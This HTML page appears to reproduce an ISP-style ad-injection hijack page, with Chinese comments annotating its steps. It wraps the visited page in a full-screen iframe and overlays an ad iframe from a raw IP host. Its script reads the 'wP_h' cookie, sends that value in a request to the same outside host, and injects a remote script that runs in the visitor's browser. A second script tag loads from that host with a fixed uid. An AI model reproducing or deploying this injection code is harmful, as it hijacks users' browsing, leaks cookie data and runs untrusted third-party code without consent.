<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            color: #000;
            overflow: hidden;
            padding: 0;
            height: 100%;
            font-family: Arial
        }

        #i {
            display: block;
            position: absolute;
            z-index: 1;
            width: 100%;
            height: 100%
        }
    </style>

    <script src="../static/js/jquery-3.1.1.js"></script>

</head>
<body></body>
<body onload="a7.u()">
<div id="lovexin15"
     style="display: block; position: fixed; z-index: 2; right: 0px; bottom: 0px; width: 100%; height: 47px;">
    <!--iframe-->
    <iframe id="ad_iframe" width="100%" height="47px" scrolling="no"
            src="http://61.174.50.211:8001/tv/tv_ad_mb.php?uid=c48022937d7d2d7b61fbe4efa870b45bb81cca18&amp;tag=114&amp;from=1"
            frameborder="0">
    </iframe>
    <!--关闭按钮-->
    <a style="cursor: pointer; display: block;
    position: absolute; border: 1px; border-radius: 1em;
    background-color: rgb(255, 255, 255); color: rgb(51, 51, 51);
    opacity: 0.8; z-index: 3; right: 2px; top: 5%; margin-top: -10px;
    line-height: 20px; text-align: center; width: 20px; font-size: 14px;">X</a>
</div>
<div id="i">
    <iframe id="m" frameborder="0" width="100%" height="100%"
            src="http://127.0.0.1:8080/test/test1">
        <!--src="http://iliangqunru.com/post/2016/?_t_t_t=0.2881289859424496">-->
    </iframe>
</div>
<script>
    (function (w) {
        var a7 = w.a7 || {};
        var d = document;
        var mim_c = function (mim_d, mim_f) {
            var mim_g = mim_f || document.all || document.getElementsByTagName("*");
            //获取dom最后一  个节点
            var mim_f = mim_g[mim_g.length - 1];
            mim_f.parentNode.appendChild(mim_d);
        };
        a7.u = function () {
            //获取url
            var f = d.location.href;
            //拼接url
            d.getElementById("m").src = f + (f.indexOf("?") < 0 ? '?' : '&') + '_t_t_t=' + Math.random();
            var url = "http://61.174.50.211:8001/tv/adc.php?account=&h";
            //分割cookie
            var uki = d.cookie.split("; ");
            var wP_h;
            for (var i = 0; i < uki.length; i++) {
                var arr = uki[i].split("=");
                if ("wP_h" == arr[0]) {
                    wP_h = arr[1];
                    break;
                }
            }

            //替换,形成http://61.174.50.211:8001/tv/adc.php?account=iliangqunru
            var nu = url.replace(/&h/, wP_h);
            var mim_b = document.createElement("script");
            mim_b.type = "text/javascript";
            debugger;
            mim_b.src = nu;
            mim_c(mim_b);
        };
        //循环调用
        w.a7 = a7;
    })(window);

</script>

<script type="text/javascript"
        src="http://61.174.50.211:8001/tv/adc.php?account=c48022937d7d2d7b61fbe4efa870b45bb81cca18">
</script>

</body>
</html>